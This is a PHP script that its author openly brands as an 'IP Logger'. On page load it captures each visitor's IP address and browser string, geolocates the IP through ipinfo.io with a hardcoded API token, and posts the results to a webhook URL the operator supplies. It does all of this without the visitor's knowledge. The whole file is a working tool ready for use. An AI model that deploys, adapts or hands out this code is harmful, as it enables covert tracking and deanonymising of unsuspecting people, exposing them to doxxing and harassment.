<?php

$ip = $_SERVER['REMOTE_ADDR']; # 
$browser = $_SERVER['HTTP_USER_AGENT'];
$url = "WEBHOOK_HERE"; # Put your Webhook URL here


$ipinfo = file_get_contents("https://ipinfo.io/${ip}?token=6d2a4b25add82e");

$hookObject = json_encode([
    "username" => "franafp.com | IP Logger ",
    "avatar_url" => "https://franafp.com/uploader/cdn/fran.jpeg",
    "tts" => false,
    "embeds" => [
        [
            "title" => "franafp.com IP LOGGER",
            "type" => "rich",
            "description" => "You can see more information about the IP grabber in [wtp.franafp.com](https://wtp.franafp.com/posts/php-ip-logger)",
            "timestamp" => "1810-01-10T19:12:00-05:00",
            "color" => hexdec( "7800b0" ),
            "footer" => [
                "text" => "IP Logger fran_afp_#0001 ",
                "icon_url" => "https://franafp.com/uploader/cdn/fran.jpeg"
            ],
            "author" => [
                "name" => "franafp.com",
                "icon_url" => "https://franafp.com/uploader/cdn/fran.jpeg"
             ],

            "fields" => [
                [
                    "name" => "IP",
                    "value" => "```{$ip}```",
                    "inline" => false
                ],
                [
                    "name" => "Browser",
                    "value" => "```{$browser}```",
                    "inline" => false
                ],
                [
                    "name" => "IP Lookup",
                    "value" => "```{$ipinfo}```",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

# Developed by fran_afp_#0001
?>
